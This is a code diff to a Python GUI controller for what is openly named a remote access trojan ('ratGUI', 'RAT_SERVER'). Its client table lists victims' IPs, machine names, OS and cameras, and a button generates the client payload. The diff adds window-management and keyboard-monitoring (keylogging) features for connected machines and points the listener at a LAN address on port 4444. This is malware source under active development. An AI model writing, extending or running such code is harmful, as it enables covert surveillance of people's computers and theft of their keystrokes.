@@ -10,6 +10,8 @@ import threading
 import queue
 from modules.generate_client_demo import generate_client
 from modules.terminal import Terminal
+from modules.window import WindowManager
+from modules.keyboard import Keyboard
 import logging
 logging.basicConfig(level=logging.DEBUG,
                     format='%(asctime)s - %(levelname)s - %(message)s')
@@ -78,7 +80,7 @@ class ratGUI:
             ("终端管理", self.terminal_management),
             ("进程管理", self.process_management),
             ("窗口管理", self.window_management),
-            ("桌面管理", self.desktop_management),
+            ("键盘管理", self.keyboard_management),
             ("文件管理", self.file_management),
             ("语言管理", self.language_management),
             ("视频管理", self.video_management),
@@ -97,7 +99,7 @@ class ratGUI:
 
     def create_table(self):
         '''
-        创建clint列表
+        创建client列表
         '''
         
         columns = ("IP", "端口", "计算机名/备注", "操作系统", "CPU", "摄像头", "PING")
@@ -233,7 +235,7 @@ class ratGUI:
         if self.current_client is None:
             messagebox.showerror("错误", "请先选择一个客户端")
             return
-        terminal = Terminal(self.root, *self.current_client)
+        Terminal(self.root, *self.current_client)
         
     def generate_server(self):
         generate_client(self.root)
@@ -242,7 +244,22 @@ class ratGUI:
         messagebox.showinfo("进程管理", "进程管理功能")
 
     def window_management(self):
-        messagebox.showinfo("窗口管理", "窗口管理功能")
+        '''
+        窗口管理
+        '''
+        if self.current_client is None:
+            messagebox.showerror("错误", "请先选择一个客户端")
+            return
+        WindowManager(self.root, self.current_client)
+        
+    def keyboard_management(self):
+        '''
+        键盘监控
+        '''
+        if self.current_client is None:
+            messagebox.showerror("错误", "请先选择一个客户端")
+            return
+        Keyboard(self.root, *self.current_client) # *解包成socket和两个queue
 
     def desktop_management(self):
         messagebox.showinfo("桌面管理", "桌面管理功能")
@@ -274,7 +291,8 @@ class ratGUI:
 
 
 if __name__ == "__main__":
-    rat = RAT_SERVER("127.0.0.1", 4444)
+    # rat = RAT_SERVER("127.0.0.1", 4444)
+    rat = RAT_SERVER("10.211.55.2", 4444)
     root = tk.Tk()
     root.geometry("800x600")
     app = ratGUI(root, rat)
